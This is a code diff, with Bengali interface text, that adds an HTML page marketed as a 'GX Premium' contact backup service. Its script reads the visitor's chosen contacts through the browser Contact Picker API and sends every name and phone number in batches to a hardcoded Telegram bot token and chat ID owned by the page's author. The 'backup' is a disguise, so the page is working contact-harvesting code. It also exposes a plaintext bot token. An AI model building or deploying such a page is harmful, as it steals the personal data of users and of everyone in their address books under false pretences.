@@ -1,65 +1,128 @@
-// আগের স্ক্রিপ্টের sendToTelegram ফাংশনটি এই আপডেট করা কোড দিয়ে রিপ্লেস করুন
-
-async function sendToTelegram() {
-    const status = document.getElementById('status');
-    const sendBtn = document.getElementById('send-btn');
-    
-    if (selectedContacts.length === 0) {
-        status.innerText = "কোনো কন্টাক্ট সিলেক্ট করা হয়নি!";
-        return;
-    }
-
-    sendBtn.disabled = true;
-    status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> পাঠানো হচ্ছে...`;
-
-    const CHUNK_SIZE = 15; // প্রতি মেসেজে ১৫ জন করে পাঠাবে (নিরাপদ লিমিট)
-    const totalContacts = selectedContacts.length;
-    
-    const now = new Date();
-    const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
-    const dayName = days[now.getDay()];
-    const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
-    const timeStr = now.toLocaleTimeString('bn-BD');
-
-    for (let i = 0; i < totalContacts; i += CHUNK_SIZE) {
-        const chunk = selectedContacts.slice(i, i + CHUNK_SIZE);
-        
-        let message = `📊 **GX Backup number** (Part: ${Math.floor(i/CHUNK_SIZE) + 1})\n\n`;
-        message += `📅 ${dayName}, ${dateStr}\n`;
-        message += `⏰ ${timeStr}\n`;
-        message += `👥 Total: ${totalContacts}\n\n`;
-
-        chunk.forEach((c) => {
-            const name = c.name && c.name[0] ? c.name[0] : "No Name";
-            const phone = c.tel && c.tel[0] ? c.tel[0] : "No Number";
-            message += `Name : ──${name}─\n`;
-            message += `Number : ${phone}\n\n`;
-        });
-
-        message += `— GX Sammim sent`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // প্রতি মেসেজের মাঝে ১ সেকেন্ড গ্যাপ (Rate Limit এড়ানো)
-            status.innerHTML = `প্রগতি: ${Math.min(i + CHUNK_SIZE, totalContacts)} / ${totalContacts}`;
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-        } catch (err) {
-            console.error("Error sending chunk:", err);
-            status.innerText = "সার্ভার এরর! ইন্টারনেট চেক করুন।";
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GX Premium Backup</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body { background: #0b0e14; color: white; font-family: sans-serif; }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            box-shadow: 0 10px 50px rgba(0,0,0,0.5);
+            padding: 30px;
+            width: 95%; max-width: 400px;
         }
-    }
+        .premium-btn {
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            border: none; padding: 16px; border-radius: 15px;
+            color: #000; font-weight: 800; width: 100%;
+            transition: 0.3s; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(79, 172, 254, 0.4);
+        }
+        .premium-btn:active { transform: scale(0.95); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
 
-    status.innerHTML = `✅ সব (${totalContacts}টি) নম্বর সফলভাবে পাঠানো হয়েছে!`;
-    sendBtn.disabled = false;
-    alert("সব তথ্য সফলভাবে GX বোর্ডে পাঠানো হয়েছে!");
-}
+    <div class="glass-card text-center">
+        <div class="mb-8">
+            <div class="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-blue-400/30">
+                <i class="fas fa-address-book text-4xl text-blue-400"></i>
+            </div>
+            <h1 class="text-2xl font-black tracking-tighter">GX SAMMIM</h1>
+            <p class="text-gray-500 text-xs mt-1 uppercase tracking-widest">Ultra Premium Cloud Sync</p>
+        </div>
+
+        <div id="main-view">
+            <button onclick="fetchContacts()" class="premium-btn">
+                <i class="fas fa-cloud-upload-alt mr-2"></i> কন্টাক্ট ব্যাকআপ করুন
+            </button>
+        </div>
+
+        <div id="status" class="mt-6 text-sm font-medium text-blue-400"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
+        const CHAT_ID = '6467941734';
+
+        async function fetchContacts() {
+            const status = document.getElementById('status');
+            
+            // ১. চেক করা হচ্ছে ব্রাউজার সাপোর্ট করে কি না
+            if (!('contacts' in navigator && 'ContactsManager' in window)) {
+                status.innerHTML = "❌ এই ব্রাউজার সাপোর্ট করছে না। দয়া করে অ্যান্ড্রয়েড ক্রোম (Chrome) ব্যবহার করুন এবং HTTPS সাইটে ট্রাই করুন।";
+                return;
+            }
+
+            try {
+                const props = ['name', 'tel'];
+                const opts = { multiple: true };
+                
+                status.innerText = "অনুমতি দিন এবং নম্বর সিলেক্ট করুন...";
+                const contacts = await navigator.contacts.select(props, opts);
+
+                if (contacts && contacts.length > 0) {
+                    status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> প্রসেসিং... (০/${contacts.length})`;
+                    await sendData(contacts);
+                }
+            } catch (err) {
+                status.innerText = "ভুল হয়েছে: " + err.message;
+            }
+        }
+
+        async function sendData(contacts) {
+            const status = document.getElementById('status');
+            const CHUNK_SIZE = 10; 
+            
+            const now = new Date();
+            const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
+            const dayName = days[now.getDay()];
+            const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
+            const timeStr = now.toLocaleTimeString('bn-BD');
+
+            for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
+                const chunk = contacts.slice(i, i + CHUNK_SIZE);
+                let message = `📊 **GX Backup number**\n\n`;
+                message += `📅 ${dayName}, ${dateStr}\n`;
+                message += `⏰ ${timeStr}\n`;
+                message += `👥 Total Contacts: ${contacts.length}\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+                chunk.forEach(c => {
+                    const name = c.name ? c.name[0] : 'No Name';
+                    const tel = c.tel ? c.tel[0] : 'No Number';
+                    message += `Name : ──${name}─\n`;
+                    message += `Number : ${tel}\n\n`;
+                });
+
+                message += `— GX Sammim sent`;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    status.innerText = `পাঠানো হচ্ছে: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
+                    // ১ সেকেন্ড অপেক্ষা (সেফটি)
+                    await new Promise(r => setTimeout(r, 1000)); 
+                } catch (e) {
+                    console.error(e);
+                }
+            }
+            status.innerHTML = "✅ সফলভাবে বোর্ডে সব নম্বর পাঠানো হয়েছে!";
+        }
+    </script>
+</body>
+</html>
